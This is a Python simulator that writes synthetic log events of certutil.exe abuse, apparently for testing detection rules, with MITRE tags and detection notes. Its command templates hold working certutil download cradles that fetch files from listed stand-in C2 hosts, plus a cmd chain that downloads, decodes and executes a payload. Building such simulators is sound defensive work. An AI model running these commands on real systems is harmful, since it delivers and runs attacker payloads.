"""
simulator/certutil.py
─────────────────────────────────────────────────────────────────────────────
Simulates payload download / decode abuse via certutil.exe.

certutil.exe is a legitimate Windows binary (part of Certificate Services)
that has been widely abused because it can:
  1. Download files from the internet  (-urlcache -split -f <url> <outfile>)
  2. Decode Base64-encoded files        (-decode <infile> <outfile>)
  3. Decode hex-encoded files           (-decodehex)

Techniques covered
──────────────────
  • T1105    — Ingress Tool Transfer (download via -urlcache)
  • T1140    — Deobfuscate / Decode Files or Information (-decode)
  • T1218    — System Binary Proxy Execution (LOLBAS)

Usage
─────
    python certutil.py --count 6 --pretty
    python certutil.py --count 50 --scenario download --output logs/certutil.jsonl
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent))
from base import EventGenerator


# ── Command templates ─────────────────────────────────────────────────────────

# -urlcache download cradles
_DOWNLOAD_CMDS: list[str] = [
    "certutil.exe -urlcache -split -f http://{url}/{fname} {outpath}\\{fname}",
    "certutil.exe -urlcache -f https://{url}/{fname} {outpath}\\{fname}",
    "certutil -urlcache -split -f ftp://{url}/{fname} C:\\windows\\temp\\{fname}",
    'certutil.exe -verifyctl -f -split "http://{url}/{fname}" {outpath}\\{fname}',
    "certutil -urlcache -split -f http://{url}/update C:\\programdata\\{fname}",
]

# -decode abuse (Base64 / hex decoding of a staged file)
_DECODE_CMDS: list[str] = [
    "certutil.exe -decode {outpath}\\{encoded_name} {outpath}\\{fname}",
    "certutil -decode C:\\users\\public\\{encoded_name} C:\\windows\\temp\\{fname}",
    "certutil.exe -decodehex {outpath}\\{encoded_name} {outpath}\\{fname}",
    "certutil -f -decode C:\\programdata\\{encoded_name} C:\\windows\\temp\\{fname}",
]

# Chain: download then decode (most dangerous variant)
_CHAIN_CMDS: list[str] = [
    (
        "cmd.exe /c certutil -urlcache -split -f http://{url}/{encoded_name} "
        "{outpath}\\{encoded_name} && certutil -decode {outpath}\\{encoded_name} "
        "{outpath}\\{fname} && {outpath}\\{fname}"
    ),
    (
        'certutil -urlcache -f http://{url}/{encoded_name} {outpath}\\{encoded_name}'
        " & certutil -decode {outpath}\\{encoded_name} {outpath}\\{fname}"
    ),
]

_C2_URLS: list[str] = [
    "185.220.101.47",
    "cdn-update.xyz",
    "dl.softwareupdate.net",
    "104.21.44.180/files",
    "45.142.212.100/updates",
    "raw.githubusercontent.com/c0def00/d00m/refs/heads/main/drop",
]

_OUTPUT_PATHS: list[str] = [
    "C:\\windows\\temp",
    "C:\\users\\public",
    "C:\\programdata",
    "C:\\windows\\system32",
    "C:\\users\\{user}\\appdata\\roaming",
]

_FILENAMES: list[str] = [
    "update.exe",
    "svchost.dll",
    "ntdll.tmp",
    "payload.bin",
    "stager.ps1",
    "beacon.exe",
    "msupdate.bat",
]

_ENCODED_EXTENSIONS: list[str] = [".b64", ".txt", ".enc", ".dat", ".tmp"]

_PARENT_PROCESSES: list[str] = [
    "cmd.exe",
    "powershell.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "explorer.exe",
]


# ─────────────────────────────────────────────────────────────────────────────
# CertutilAbuseSimulator
# ─────────────────────────────────────────────────────────────────────────────

class CertutilAbuseSimulator(EventGenerator):
    """Simulates certutil.exe abused for payload staging and decoding.

    Three scenarios are available:

    ``download``
        certutil downloading a file directly from a remote URL
        (T1105 — Ingress Tool Transfer).

    ``decode``
        certutil decoding a pre-staged Base64/hex blob into an executable
        (T1140 — Deobfuscate Files).

    ``chain``
        Download-then-decode-then-execute in a single command chain —
        the most dangerous and most detectable variant.

    Parameters
    ----------
    scenario:
        One of ``"download"``, ``"decode"``, ``"chain"``, or ``"random"``
        (the default, which picks uniformly at random).
    **kwargs:
        Forwarded to :class:`~base.EventGenerator`.
    """

    SOURCE = "certutil_abuse"
    VALID_SCENARIOS = ("download", "decode", "chain", "random")

    def __init__(self, scenario: str = "random", **kwargs: Any) -> None:
        kwargs.setdefault("source", self.SOURCE)
        super().__init__(**kwargs)
        if scenario not in self.VALID_SCENARIOS:
            raise ValueError(
                f"Invalid scenario '{scenario}'. "
                f"Choose from {self.VALID_SCENARIOS}."
            )
        self._scenario = scenario

    # ── Core generator ────────────────────────────────────────────────────────

    def generate_event(self) -> dict[str, Any]:
        scenario = (
            self._choice(["download", "decode", "chain"])
            if self._scenario == "random"
            else self._scenario
        )
        if scenario == "download":
            return self._download_event()
        elif scenario == "decode":
            return self._decode_event()
        else:
            return self._chain_event()

    # ── Scenario implementations ──────────────────────────────────────────────

    def _build_path_vars(self) -> dict[str, str]:
        user         = self._choice(self.users)
        fname        = self._choice(_FILENAMES)
        encoded_name = self._randhex(12) + self._choice(_ENCODED_EXTENSIONS)
        out_path     = (
            self._choice(_OUTPUT_PATHS).replace("{user}", user)
        )
        c2_url       = self._choice(_C2_URLS)
        return {
            "user"        : user,
            "fname"       : fname,
            "encoded_name": encoded_name,
            "outpath"     : out_path,
            "url"         : c2_url,
        }

    def _download_event(self) -> dict[str, Any]:
        v = self._build_path_vars()
        cmd = (
            self._choice(_DOWNLOAD_CMDS)
            .format(**v)
        )
        return self._base_event(
            process        = "certutil.exe",
            parent_process = self._choice(_PARENT_PROCESSES),
            command        = cmd,
            user           = v["user"],
            severity       = "high",
            tags           = [
                "T1105",        # Ingress Tool Transfer
                "T1218",        # LOLBAS
                "certutil",
                "urlcache",
                "download",
            ],
            extra = {
                "c2_url"         : v["url"],
                "output_path"    : f"{v['outpath']}\\{v['fname']}",
                "certutil_flags" : ["-urlcache", "-split", "-f"],
                "detection_note" : (
                    "certutil -urlcache is a classic LOLBAS download technique. "
                    "Flag any certutil invocation containing '-urlcache' or '-f'."
                ),
            },
        )

    def _decode_event(self) -> dict[str, Any]:
        v = self._build_path_vars()
        cmd = (
            self._choice(_DECODE_CMDS)
            .format(**v)
        )
        flags = ["-decode"] if "-decode " in cmd else ["-decodehex"]
        return self._base_event(
            process        = "certutil.exe",
            parent_process = self._choice(_PARENT_PROCESSES),
            command        = cmd,
            user           = v["user"],
            severity       = "medium",
            tags           = [
                "T1140",        # Deobfuscate/Decode
                "T1218",        # LOLBAS
                "certutil",
                "decode",
            ],
            extra = {
                "input_file"     : f"{v['outpath']}\\{v['encoded_name']}",
                "output_file"    : f"{v['outpath']}\\{v['fname']}",
                "certutil_flags" : flags,
                "detection_note" : (
                    "certutil -decode transforms Base64 blobs into binaries. "
                    "Alert when input is in temp/public paths and output is an "
                    "executable extension."
                ),
            },
        )

    def _chain_event(self) -> dict[str, Any]:
        v = self._build_path_vars()
        cmd = (
            self._choice(_CHAIN_CMDS)
            .format(**v)
        )
        return self._base_event(
            process        = "certutil.exe",
            parent_process = "cmd.exe",
            command        = cmd,
            user           = v["user"],
            severity       = "critical",
            tags           = [
                "T1105",        # Ingress Tool Transfer
                "T1140",        # Deobfuscate/Decode
                "T1218",        # LOLBAS
                "certutil",
                "download-and-execute",
                "chained",
            ],
            extra = {
                "c2_url"         : v["url"],
                "encoded_file"   : f"{v['outpath']}\\{v['encoded_name']}",
                "decoded_file"   : f"{v['outpath']}\\{v['fname']}",
                "execution"      : True,
                "certutil_flags" : ["-urlcache", "-f", "-decode"],
                "detection_note" : (
                    "Download-decode-execute chain is a critical-severity indicator. "
                    "The chained '&& <exe>' execution confirms immediate weaponisation."
                ),
            },
        )

    # ── Additional scenarios ──────────────────────────────────────────────────

    def generate_hash_verification_abuse(self) -> dict[str, Any]:
        """certutil -hashfile used for stealth file validation by attacker."""
        fname = self._choice(_FILENAMES)
        path  = f"C:\\windows\\temp\\{fname}"
        algo  = self._choice(["MD5", "SHA1", "SHA256"])
        cmd   = f"certutil -hashfile {path} {algo}"
        return self._base_event(
            process        = "certutil.exe",
            parent_process = "cmd.exe",
            command        = cmd,
            severity       = "low",
            tags           = ["T1218", "certutil", "hash-check", "situational"],
            extra          = {
                "file_path"      : path,
                "hash_algorithm" : algo,
                "detection_note" : (
                    "Low-severity alone, but a high-fidelity indicator when "
                    "observed immediately after a certutil download event on the "
                    "same host (hash verification of staged payload)."
                ),
            },
        )


# ── CLI entry point ───────────────────────────────────────────────────────────

def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Simulate certutil.exe payload download / decode events.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--count", "-n", type=int, default=5)
    parser.add_argument(
        "--scenario",
        choices=["random", "download", "decode", "chain", "hash_check"],
        default="random",
    )
    parser.add_argument("--output", "-o", type=str, default=None)
    parser.add_argument("--pretty", action="store_true")
    parser.add_argument("--seed", type=int, default=None)
    return parser.parse_args()


def main() -> None:
    args = _parse_args()
    sim = CertutilAbuseSimulator(
        scenario    = args.scenario if args.scenario != "hash_check" else "random",
        output_file = args.output,
        pretty      = args.pretty,
        seed        = args.seed,
    )

    for _ in range(args.count):
        if args.scenario == "hash_check":
            sim.emit(sim.generate_hash_verification_abuse())
        else:
            sim.emit()


if __name__ == "__main__":
    main()

